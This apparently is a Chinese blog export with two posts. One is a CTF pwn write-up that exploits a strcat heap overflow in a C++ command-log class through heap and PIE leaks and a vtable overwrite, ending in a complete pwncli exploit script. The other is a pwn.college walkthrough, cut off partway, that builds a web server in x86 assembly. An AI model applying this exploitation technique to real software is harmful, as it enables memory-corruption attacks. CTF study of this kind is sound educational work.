<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">long getLongVar(const char* name) &#123;</span><br><span class="line">    Variable* v = getvarbyname(name);</span><br><span class="line">    if (v-&gt;type == LONG) &#123;</span><br><span class="line">        return v-&gt;value.l;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;Invalid variable &quot; &lt;&lt; name &lt;&lt; &quot;: &quot; &lt;&lt; v-&gt;value.s &lt;&lt; std::endl;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还可以用log来创建新的log</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while (true) &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;&gt; &quot;;</span><br><span class="line">        char cmd[20];</span><br><span class="line">        std::cin &gt;&gt; cmd;</span><br><span class="line"></span><br><span class="line">        if (cmd[0] == &#x27;$&#x27;) &#123;</span><br><span class="line">            if (cmd[1] == &#x27;(&#x27; &amp;&amp; cmd[2] == &#x27;(&#x27;) &#123;</span><br><span class="line">                process_arithmetic(cmd + 3);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                char* p = std::strchr(cmd, &#x27;=&#x27;);</span><br><span class="line">                if (p) &#123;</span><br><span class="line">                    *p = 0;</span><br><span class="line">                    setvar(cmd + 1, p);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    Variable* c_v = getvarbyname(cmd + 1);  </span><br><span class="line">                    c_v -&gt; print();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (!strcmp(cmd, &quot;log&quot;)) &#123;</span><br><span class="line">            std::cout &lt;&lt; &quot;Creating new log&quot; &lt;&lt; std::endl;</span><br><span class="line">            log = new Log();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            std::cout &lt;&lt; cmd &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (log-&gt;get_size() &gt;= MAX_LOG_SIZE) &#123;</span><br><span class="line">            log-&gt;reset_log();</span><br><span class="line">        &#125;</span><br><span class="line">        log-&gt;add_cmd_to_log(cmd);</span><br><span class="line">        log-&gt;increase_size();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>漏洞也就在这，<code>log-&gt;add_cmd_to_log()</code>并不是一次读取1字节，而他的size增长确实一次只+1，而MAX_LOG_SIZE为10，也就是允许读入10次20字节的数据，很明显这会造成堆溢出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Log &#123;</span><br><span class="line">    private:</span><br><span class="line">        int size;</span><br><span class="line">        char logs[MAX_LOG_SIZE];</span><br><span class="line"></span><br><span class="line">    public:</span><br><span class="line">        Log() &#123;</span><br><span class="line">            size = 0;</span><br><span class="line">            memset(logs, 0, MAX_LOG_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int get_size() &#123;</span><br><span class="line">            return size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        void increase_size() &#123;</span><br><span class="line">            size++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        void add_cmd_to_log(const char* cmd) &#123;</span><br><span class="line">            strcat(logs, cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        void reset_log() &#123;</span><br><span class="line">            memset(logs, 0, MAX_LOG_SIZE);</span><br><span class="line">            size = 0;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *v</span><br><span class="line">$1 = &#123;</span><br><span class="line">  _vptr.Variable = 0x55555555cbe8 &lt;vtable for longVariable+16&gt;,</span><br><span class="line">  type = LONG,</span><br><span class="line">  value = &#123;</span><br><span class="line">    l = 123,</span><br><span class="line">    s = 0x7b &lt;error: Cannot access memory at address 0x7b&gt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分别用<code>$a=12345</code>和<code>$a=abcd</code>来对比堆块分配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555570b00: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555555570b10: 0x000055555555cbe8      0x0000000000000000</span><br><span class="line">0x555555570b20: 0x0000000000003039      0x0000000000000051</span><br><span class="line">0x555555570b30: 0x0000000000000001      0x000055555555d288</span><br><span class="line">0x555555570b40: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555570b50: 0x0000555555570b60      0x0000000000000001</span><br><span class="line">0x555555570b60: 0x0000000000000061      0x0000000000000000</span><br><span class="line">0x555555570b70: 0x0000555555570b10      0x000000000000e491</span><br><span class="line">$a=12345</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555570b00: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555555570b10: 0x000055555555cbd0      0x0000000000000001</span><br><span class="line">0x555555570b20: 0x0000555555570b30      0x0000000000000021</span><br><span class="line">0x555555570b30: 0x0000000064636261      0x0000000000000000</span><br><span class="line">0x555555570b40: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x555555570b50: 0x0000000000000001      0x000055555555d288</span><br><span class="line">0x555555570b60: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555570b70: 0x0000555555570b80      0x0000000000000001</span><br><span class="line">0x555555570b80: 0x0000000000000061      0x0000000000000000</span><br><span class="line">0x555555570b90: 0x0000555555570b10      0x000000000000e471</span><br><span class="line">$a=abcd</span><br></pre></td></tr></table></figure>

<p>先创建一个0x20的chunk，用来存放print的虚表和type和值</p>
<p>STRING会再创建一个0x20的chunk来存放字符串</p>
<p>两者最后都创建一个0x50的chunk，来指向变量名和指向值</p>
<p>之后新建chunk会链接两个chunk，在0x555555570b40~0x555555570b48处，第三个chunk会导致0x000055555555d288来到第二个chunk，以后不改变，这些对于该题目并不重要</p>
<p>重点在于创建log也会新建一个0x20的chunk，可以覆写chunk0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555570ae0: 0x0000000000000000      0x0000000000000021	#log</span><br><span class="line">0x555555570af0: 0x24676f6c00000002      0x0000000000000061</span><br><span class="line">0x555555570b00: 0x0000000000000000      0x0000000000000021	#chunk0</span><br><span class="line">0x555555570b10: 0x000055555555cbe8      0x0000000000000000</span><br><span class="line">0x555555570b20: 0x000000000000007b      0x0000000000000051</span><br><span class="line">0x555555570b30: 0x0000000000000001      0x000055555555d288</span><br><span class="line">0x555555570b40: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555570b50: 0x0000555555570b60      0x0000000000000001</span><br><span class="line">0x555555570b60: 0x0000000000000061      0x0000000000000000</span><br><span class="line">0x555555570b70: 0x0000555555570b10      0x000000000000e491</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到，我们完全可以覆写chunk0的vtable和type，但本题没有给出pie和堆基址，我们还需泄露</p>
<p>观察</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">long getLongVar(const char* name) &#123;</span><br><span class="line">    Variable* v = getvarbyname(name);</span><br><span class="line">    if (v-&gt;type == LONG) &#123;</span><br><span class="line">        return v-&gt;value.l;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;Invalid variable &quot; &lt;&lt; name &lt;&lt; &quot;: &quot; &lt;&lt; v-&gt;value.s &lt;&lt; std::endl;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>LONG类型的是直接输出值，而STRING是打印出字符串指针指向的字符串，如果我们将type从STRING改为LONG，那就可以获取字符串指针，而字符串指针是在堆上的，也就获得了堆基址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$a=abc&quot;)  # 覆写v的type为long，泄露堆地址</span><br><span class="line"></span><br><span class="line">sl(&quot;a&quot; * 20)</span><br><span class="line">sl(&quot;a&quot; * 10 + &quot;|&quot;)</span><br><span class="line"></span><br><span class="line">sl(&quot;$(($a+$a))&quot;)</span><br><span class="line">ru(&quot;|&quot;)</span><br><span class="line">ru(&quot;&gt; &quot;)</span><br><span class="line">heapbase = int(int(ru(&quot;\n&quot;, drop=True), 10) / 2) - 0x13730</span><br><span class="line">log_heap_base_addr(heapbase)</span><br></pre></td></tr></table></figure>

<p>参考上面的，会打印出<code>0x0000555555570b30*2</code> </p>
<p>至于pie，堆中和pie有关的地址只有虚表和<code>variables[abi:cxx11]</code>而我们想要覆写chunk就需要覆写虚表，当然，也可以选择再新建一个不被覆写的chunk来通过他的虚表获取pie，但是我选择通过<code>variables[abi:cxx11]</code>来获取pie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$b=AAAAAA&quot;)</span><br><span class="line">sl(b&quot;a&quot; * 0x10)</span><br><span class="line">sl(b&quot;a&quot; * 0x10)</span><br><span class="line">sl(b&quot;a&quot; * 0x7 + p64(heapbase + 79704))</span><br><span class="line">sl(b&quot;$(($b+$b))&quot;)</span><br><span class="line">ru(&quot;Invalid variable b: &quot;)</span><br><span class="line">pie = u64(ru(&quot;\n&quot;, drop=True).ljust(8, b&quot;\x00&quot;)) - 37512</span><br><span class="line">log_address_ex(&quot;pie&quot;)  # 泄露pie基址，这里是chunk0的</span><br></pre></td></tr></table></figure>

<p>之后只需要将win函数填在堆上，再将虚表地址覆写为win在堆上地址即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win = 0x2DAD + pie</span><br><span class="line"></span><br><span class="line">win_addr = heapbase + 79960</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;a&quot;)</span><br><span class="line">sl(p64(win))</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$c=aaa&quot;)</span><br><span class="line">sl(&quot;a&quot; * 7)</span><br><span class="line">sl(&quot;A&quot; * 0x10)</span><br><span class="line">sl(p64(win_addr))</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from platform import win32_edition</span><br><span class="line">from pwncli import *</span><br><span class="line"></span><br><span class="line">cli_script()  # 使用脚本模式必须显式调用这个函数</span><br><span class="line">context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span><br><span class="line"></span><br><span class="line"># 你能够从gift里面取到很多东西</span><br><span class="line">io = gift[&quot;io&quot;]  # process或remote对象</span><br><span class="line">elf = gift[&quot;elf&quot;]  # ELF对象，ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = gift.libc  # ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">rop = gift.rop  # ROP对象</span><br><span class="line"></span><br><span class="line">filename = gift.filename  # current filename</span><br><span class="line">is_debug = gift.debug  # is debug or not</span><br><span class="line">is_remote = gift.remote  # is remote or not</span><br><span class="line">gdb_pid = gift.gdb_pid  # gdb pid if debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uu64 = lambda: u64(ru(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"># ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br><span class="line">if gift.remote:</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    gift[&quot;libc&quot;] = libc</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$a=abc&quot;)  # 覆写v的type为long，泄露堆地址</span><br><span class="line"></span><br><span class="line">sl(&quot;a&quot; * 20)</span><br><span class="line">sl(&quot;a&quot; * 10 + &quot;|&quot;)</span><br><span class="line"></span><br><span class="line">sl(&quot;$(($a+$a))&quot;)</span><br><span class="line">ru(&quot;|&quot;)</span><br><span class="line">ru(&quot;&gt; &quot;)</span><br><span class="line">heapbase = int(int(ru(&quot;\n&quot;, drop=True), 10) / 2) - 0x13730</span><br><span class="line">log_heap_base_addr(heapbase)</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$b=AAAAAA&quot;)</span><br><span class="line">sl(b&quot;a&quot; * 0x10)</span><br><span class="line">sl(b&quot;a&quot; * 0x10)</span><br><span class="line">sl(b&quot;a&quot; * 0x7 + p64(heapbase + 79704))</span><br><span class="line"></span><br><span class="line">sl(b&quot;$(($b+$b))&quot;)</span><br><span class="line">ru(&quot;Invalid variable b: &quot;)</span><br><span class="line">pie = u64(ru(&quot;\n&quot;, drop=True).ljust(8, b&quot;\x00&quot;)) - 37512</span><br><span class="line">log_address_ex(&quot;pie&quot;)  # 泄露pie基址</span><br><span class="line">win = 0x2DAD + pie</span><br><span class="line"></span><br><span class="line">win_addr = heapbase + 79960</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;a&quot;)</span><br><span class="line">sl(p64(win))</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$c=aaa&quot;)</span><br><span class="line">sl(&quot;a&quot; * 7)</span><br><span class="line">sl(&quot;A&quot; * 0x10)</span><br><span class="line">sl(p64(win_addr))</span><br><span class="line">sl(&quot;$c&quot;)</span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>building-a-web-server</title>
    <url>/2024/10/21/pwn-college-building-a-web-server/</url>
    <content><![CDATA[<h1 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h1><p>培养从头开始构建 Web 服务器所需的技能，从一个简单的程序开始，逐步发展到处理多个 HTTP GET 和 POST 请求。</p>
<h1 id="level1-Exits"><a href="#level1-Exits" class="headerlink" title="level1 Exits"></a>level1 Exits</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this challenge you will exit a program.</span><br></pre></td></tr></table></figure>

<p>本关直接给出答案了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></table></figure>

<p>使用如下命令编译出程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">as -o server.o server.s &amp;&amp; ld -o server server.o</span><br></pre></td></tr></table></figure>

<h1 id="level2-Create-Socket"><a href="#level2-Create-Socket" class="headerlink" title="level2 Create Socket"></a>level2 Create Socket</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this challenge you will create a socket.</span><br></pre></td></tr></table></figure>

<p>本关要求创建一个套接字</p>
<p>创建套接字的系统调用号为0x29</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __sys_socket(int family, int type, int protocol)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">family表示协议族，通常为2(AF_INET)IPv4</span><br><span class="line">10(AF_INET6)IPv6</span><br><span class="line">1(AF_UNIX)本地</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The socket has the indicated type, which specifies the communication semantics. </span><br><span class="line">套接字有type参数，指定了通信语义</span><br><span class="line">(1)SOCK_STREAM:面向连接的TCP</span><br><span class="line">(2)SOCK_DGRAM:无连接的UDP			</span><br><span class="line">(3)SOCK_RAW:原始套接字</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protocol指定所使用的协议</span><br><span class="line">0:默认协议</span><br><span class="line">其他具体协议的值</span><br></pre></td></tr></table></figure>

<p>我们将使用TCP，IPv4，默认协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rax,0x29   #SYS_socket</span><br><span class="line">	mov rdi,2</span><br><span class="line">	mov rsi,1</span><br><span class="line">	mov rdx,0</span><br><span class="line">	syscall</span><br><span class="line">	</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level3-Bind-Socket"><a href="#level3-Bind-Socket" class="headerlink" title="level3 Bind Socket"></a>level3 Bind Socket</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this challenge you will bind an address to a socket.</span><br></pre></td></tr></table></figure>

<p>在本关需要把一个地址绑定到一个套接字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></table></figure>

<p>我们应使用系统调用<code>0x31 bind</code></p>
<p>在上个level提到的socket系统调用的返回值是这个新建套接字的文件描述符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __sys_bind(int fd, struct sockaddr __user *umyaddr, int addrlen)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    sockaddr_in:</span><br><span class="line">        .short 2          # sa_family = AF_INET</span><br><span class="line">        .short 0x5000     # sin_port = 80</span><br><span class="line">        .long 0           # sin_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax,0x29   #SYS_socket</span><br><span class="line">	mov rdi,2</span><br><span class="line">	mov rsi,1</span><br><span class="line">	mov rdx,0</span><br><span class="line">	syscall</span><br><span class="line">	mov r10,rax</span><br><span class="line">    </span><br><span class="line">    lea rsi,sockaddr_in </span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rdx,16</span><br><span class="line">    mov rax,0x31</span><br><span class="line">    syscall         #SYS_bind</span><br><span class="line"></span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们需要设置rdi=3,rdx=16,rsi=&#123;sa_family=AF_INET,sin_port=htons(80),sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>其中最难的就是rsi的设置，需要构造一个结构体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sockaddr_in:</span><br><span class="line">    .short 2          # sa_family = AF_INET</span><br><span class="line">    .short 0x5000     # sin_port = 80</span><br><span class="line">    .long 0           # sin_addr = 0.0.0.0</span><br></pre></td></tr></table></figure>

<p>之所以是0x5000是因为大小端序</p>
<h1 id="level4-Listens-Socket"><a href="#level4-Listens-Socket" class="headerlink" title="level4 Listens Socket"></a>level4 Listens Socket</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this challenge you will listen on a socket.</span><br></pre></td></tr></table></figure>

<p>本关要求监听socket</p>
<p>listen的系统调用是0x32</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></table></figure>

<p>这个简单多了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    sockaddr_in:</span><br><span class="line">        .short 2          # sa_family = AF_INET</span><br><span class="line">        .short 0x5000     # sin_port = 80</span><br><span class="line">        .long 0           # sin_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax,0x29   #SYS_socket</span><br><span class="line">	mov rdi,2</span><br><span class="line">	mov rsi,1</span><br><span class="line">	mov rdx,0</span><br><span class="line">	syscall</span><br><span class="line">	mov r10,rax</span><br><span class="line">    </span><br><span class="line">    lea rsi,sockaddr_in </span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rdx,16</span><br><span class="line">    mov rax,0x31    #SYS_bind</span><br><span class="line">    syscall         </span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x32    #SYS_listen</span><br><span class="line">    syscall       </span><br><span class="line"></span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     # SYS_exit</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>虽然简单但也不能不分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __sys_listen(int fd, int backlog)</span><br></pre></td></tr></table></figure>

<p>fd很明显是套接字的文件描述符</p>
<p>backlog指定了一个队列的最大长度，用于存储等待连接的客户端请求。</p>
<p>他的作用是控制在服务器应用程序处理连接请求时，允许有多少个客户端连接处于“等待”状态。</p>
<h1 id="level5-Accepts-Connection"><a href="#level5-Accepts-Connection" class="headerlink" title="level5 Accepts  Connection"></a>level5 Accepts  Connection</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this challenge you will accept a connection.</span><br></pre></td></tr></table></figure>

<p>本关要求接收一个连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></table></figure>

<p>accept是0x2b</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int accept(int sockfd, struct sockaddr *_Nullable restrict addr,</span><br><span class="line">                 socklen_t *_Nullable restrict addrlen);</span><br></pre></td></tr></table></figure>

<p>sockfd很明显是socket的文件描述符</p>
<p>addr指向sockaddr结构的指针，用于存储接收到的客户端地址信息</p>
<p>addlen很明显是接收的客户端地址信息长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    sockaddr_in:</span><br><span class="line">        .short 2          # sa_family = AF_INET</span><br><span class="line">        .short 0x5000     # sin_port = 80</span><br><span class="line">        .long 0           # sin_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax,0x29   #SYS_socket</span><br><span class="line">	mov rdi,2</span><br><span class="line">	mov rsi,1</span><br><span class="line">	mov rdx,0</span><br><span class="line">	syscall</span><br><span class="line">	mov r10,rax</span><br><span class="line">    </span><br><span class="line">    lea rsi,sockaddr_in </span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rdx,16</span><br><span class="line">    mov rax,0x31    #SYS_bind</span><br><span class="line">    syscall         </span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x32    #SYS_listen</span><br><span class="line">    syscall       </span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    mov rax,0x2b    #SYS_accept</span><br><span class="line">    syscall </span><br><span class="line">    </span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level6-Responds-Request-statically"><a href="#level6-Responds-Request-statically" class="headerlink" title="level6 Responds Request(statically )"></a>level6 Responds Request(statically )</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this challenge you will respond to an http request.</span><br></pre></td></tr></table></figure>

<p>本关要求响应一个http请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">[ ] close(4) = 0</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></table></figure>

<p>从套接字中读取数据，向套接字中写入数据，关闭套接字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssize_t read(int fd, void buf[.count], size_t count);</span><br><span class="line">ssize_t write(int fd, const void buf[.count], size_t count);</span><br><span class="line">int close(int fd);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这次的三个函数应该不用过多介绍</p>
<p>需要注意的是，要创建一个read_buf用于存储接收到的数据，创建一个message来存储要write的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .data</span><br><span class="line">    message:</span><br><span class="line">        .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">    message_len = . - message</span><br><span class="line">.section .bss</span><br><span class="line">    read_buf: .space 1024</span><br></pre></td></tr></table></figure>

<p>data段上的message</p>
<p>他用了.ascii来定义多个字节，使用<code>. - message</code>来计算message的长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    sockaddr_in:</span><br><span class="line">    .word 2              # sa_family = AF_INET</span><br><span class="line">    .word 0x5000         # sin_port = htons(80)</span><br><span class="line">    .long 0              # sin_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line">    message:</span><br><span class="line">        .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">    message_len = . - message</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    read_buf: .space 1024    # 预留1024字节的空间用于读取数据</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax,0x29   #SYS_socket</span><br><span class="line">	mov rdi,2</span><br><span class="line">	mov rsi,1</span><br><span class="line">	mov rdx,0</span><br><span class="line">	syscall</span><br><span class="line">	mov r10,rax</span><br><span class="line">    </span><br><span class="line">    lea rsi,sockaddr_in </span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rdx,16</span><br><span class="line">    mov rax,0x31    #SYS_bind</span><br><span class="line">    syscall         </span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x32    #SYS_listen</span><br><span class="line">    syscall       </span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    mov rax,0x2b    #SYS_accept</span><br><span class="line">    syscall</span><br><span class="line">    mov r12,rax</span><br><span class="line">    </span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,1024</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x0     #SYS_read</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    lea rsi,message</span><br><span class="line">    mov rdx,message_len</span><br><span 